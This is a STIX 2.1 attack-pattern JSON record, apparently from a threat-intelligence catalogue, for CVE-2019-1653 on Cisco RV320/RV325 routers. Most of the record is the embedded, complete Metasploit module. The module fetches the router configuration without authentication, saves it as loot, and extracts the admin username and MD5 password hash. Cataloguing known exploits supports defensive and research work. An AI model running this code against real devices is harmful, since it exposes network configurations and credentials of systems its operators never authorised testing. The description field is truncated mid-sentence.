{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a82d67e0-f2d2-4257-ad74-ca46d058abdc",
    "created": "2024-08-14T16:32:48.578816Z",
    "modified": "2024-08-14T16:32:48.578821Z",
    "name": "Cisco RV320/RV326 Configuration Disclosure",
    "description": " A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN routers could allow an unauthenticated remote attacker to retrieve sensitive information. The vulnerability is due",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/cisco_rv320_config.rb",
            "external_id": "cisco_rv320_config.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1653"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Jan/52"
        },
        {
            "source_name": "reference",
            "url": "https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20110330-acs.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco RV320/RV326 Configuration Disclosure',\n      'Description'    => %q{\n          A vulnerability in the web-based management interface of Cisco Small Business\n          RV320 and RV325 Dual Gigabit WAN VPN routers could allow an unauthenticated,\n          remote attacker to retrieve sensitive information. The vulnerability is due\n          to improper access controls for URLs. An attacker could exploit this\n          vulnerability by connecting to an affected device via HTTP or HTTPS and\n          requesting specific URLs. A successful exploit could allow the attacker to\n          download the router configuration or detailed diagnostic information. Cisco\n          has released firmware updates that address this vulnerability.\n        },\n      'Author'         =>\n        [\n          'RedTeam Pentesting GmbH <release@redteam-pentesting.de>',\n          'Aaron Soto <asoto@rapid7.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '46262'],\n          ['BID', '106732'],\n          ['CVE', '2019-1653'],\n          ['URL', 'https://seclists.org/fulldisclosure/2019/Jan/52'],\n          ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801'],\n          ['URL', 'https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20110330-acs.html']\n        ],\n      'DisclosureDate' => '2019-01-24',\n      'DefaultOptions' =>\n        {\n          'SSL'   => true\n        }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'Path to the device configuration file', '/cgi-bin/config.exp']),\n      ])\n  end\n\n  def report_cred(user, hash)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: ssl ? 'https' : 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: :nonreplayable_hash,\n      jtr_format: 'md5',\n      username: user,\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def parse_config(config)\n    # Report loot to database (and store on filesystem)\n    stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, config)\n    print_good(\"Stored configuration (#{config.length} bytes) to #{stored_path}\")\n\n    # Report host information to database\n    hostname = config.match(/^HOSTNAME=(.*)/)[1]\n    model = config.match(/^MODEL=(.*)/)[1]\n    mac = config.match(/^LANMAC=(.*)/)[1]\n    mac = mac.scan(/\\w{2}/).join(':')\n    report_host(host: rhost,\n                mac: mac,\n                name: hostname,\n                os_name: 'Cisco',\n                os_flavor: model)\n\n    # Report password hashes to database\n    user = config.match(/^user (.*)/)[1]\n    hash = config.match(/^password (.*)/)[1]\n    report_cred(user, hash)\n  end\n\n  def run\n    begin\n      uri = normalize_uri(target_uri.path)\n      res = send_request_cgi({\n        'uri'     => uri,\n        'method'  => 'GET',\n      }, 60)\n    rescue OpenSSL::SSL::SSLError\n      fail_with(Failure::UnexpectedReply, 'SSL handshake failed.  Consider setting SSL to false and trying again.')\n    end\n\n    if res.nil?\n      fail_with(Failure::UnexpectedReply, 'Empty response.  Please validate the RHOST and TARGETURI options and try again.')\n    elsif res.code != 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected HTTP #{res.code} response.  Please validate the RHOST and TARGETURI options and try again.\")\n    end\n\n    body = res.body\n    if body.match(/####sysconfig####/)\n      parse_config(body)\n    else body.include?\"meta http-equiv=refresh content='0; url=/default.htm'\"\n      fail_with(Failure::NotVulnerable, 'Response suggests device is patched')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-01-24"
}